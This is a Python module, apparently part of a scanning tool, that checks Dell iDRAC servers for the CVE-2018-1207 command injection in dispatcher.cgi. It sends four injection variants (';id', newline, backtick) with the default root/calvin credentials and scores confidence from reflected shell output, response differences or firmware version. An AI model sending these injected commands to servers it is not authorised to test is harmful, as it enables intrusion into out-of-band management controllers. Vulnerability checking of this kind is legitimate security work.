"""CVE-2018-1207 - Dell iDRAC7/8 CGI injection in /cgi-bin/dispatcher.cgi.

dispatcher.cgi hands the `username` parameter to a shell without sanitising it.
Appending a command separator therefore executes the trailing command with the
web server's privileges.

The endpoint answers on patched firmware too, so reachability alone proves
nothing. The checker builds a baseline, replays the request with four injection
variants, and diffs the results. Escalation requires an actual response
difference or a firmware version provably below the 2.52.52.52 fix.

Confidence tiers:
    85-100  injection changed the response (or shell output reflected)
    60-84   firmware below threshold and dispatcher reachable
    35-59   dispatcher reachable, firmware unknown
"""

from __future__ import annotations

import asyncio
import logging
import re
from dataclasses import dataclass

from .http import HttpClient

log = logging.getLogger("idrachunter.scrape")

BASE = "/cgi-bin/dispatcher.cgi?username=root,password=calvin"

VARIANTS = [
    "/cgi-bin/dispatcher.cgi?username=root;id,password=calvin",
    "/cgi-bin/dispatcher.cgi?username=root%0aid,password=calvin",
    "/cgi-bin/dispatcher.cgi?username=root&password=calvin",
    "/cgi-bin/dispatcher.cgi?username=root%60id%60,password=calvin",
]

FIXED_IN = (2, 52, 52, 52)
SHELL_HINTS = re.compile(r"uid=\d+|gid=\d+|groups=|root:x?:0:0|/bin/(ba)?sh", re.I)


@dataclass(slots=True)
class Verdict:
    vulnerable: bool = False
    confidence: int = 0
    proof: str = ""
    method: str = ""
    firmware: str = ""
    reason: str = ""


def _fw_tuple(raw: str) -> tuple[int, ...] | None:
    parts = re.findall(r"\d+", raw or "")
    if len(parts) < 3:
        return None
    return tuple(int(p) for p in parts[:4])


def firmware_vulnerable(raw: str) -> bool | None:
    t = _fw_tuple(raw)
    if t is None:
        return None
    return t < FIXED_IN


def _norm(body: str) -> str:
    return re.sub(r"\s+", " ", body).strip()[:6000]


async def check(http: HttpClient, ip: str, port: int, tls: bool, firmware: str,
                delay: float = 0.25) -> Verdict:
    scheme = "https" if tls else "http"
    root = f"{scheme}://{ip}:{port}"
    v = Verdict(firmware=firmware)

    st, _, baseline = await http.get(root + BASE)
    if st == 0:
        v.reason = "unreachable"
        return v
    if st == 404:
        v.reason = "dispatcher.cgi absent"
        return v
    if st not in (200, 500):
        v.reason = f"dispatcher.cgi status {st}"
        return v

    v.confidence = 35
    v.method = "dispatcher.cgi reachable"

    base_norm = _norm(baseline)
    for variant in VARIANTS:
        await asyncio.sleep(delay)
        st2, _, body2 = await http.get(root + variant)
        if st2 == 0:
            continue
        if SHELL_HINTS.search(body2):
            v.vulnerable = True
            v.confidence = 96
            v.method = "shell output reflected"
            v.proof = f"GET {variant} -> {st2}, shell output in body"
            return v
        if st2 in (200, 500) and _norm(body2) != base_norm:
            v.vulnerable = True
            v.confidence = 88
            v.method = "injection altered response"
            v.proof = f"GET {variant} -> {st2}, body differs from baseline"
            return v

    fw = firmware_vulnerable(firmware)
    if fw is True:
        v.vulnerable = True
        v.confidence = 68
        v.method = "firmware below fix"
        v.proof = f"firmware {firmware} < 2.52.52.52, dispatcher reachable"
    elif fw is False:
        v.confidence = 40
        v.reason = f"firmware {firmware} >= 2.52.52.52, no injection diff"
    else:
        v.confidence = 45
        v.reason = "dispatcher reachable, firmware unknown, no diff"

    return v


async def nuclei_check(binary: str, ip: str, port: int, tls: bool,
                       timeout: int = 60) -> Verdict | None:
    if not binary:
        return None
    scheme = "https" if tls else "http"
    cmd = [binary, "-u", f"{scheme}://{ip}:{port}", "-t",
           "tools/cve-2018-1207.yaml", "-json", "-silent"]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout)
    except (asyncio.TimeoutError, OSError) as exc:
        log.debug("nuclei failed for %s: %s", ip, exc)
        return None
    if b'"matched-at"' not in out:
        return None
    return Verdict(vulnerable=True, confidence=95, method="nuclei template",
                   proof=f"nuclei matched on {scheme}://{ip}:{port}")
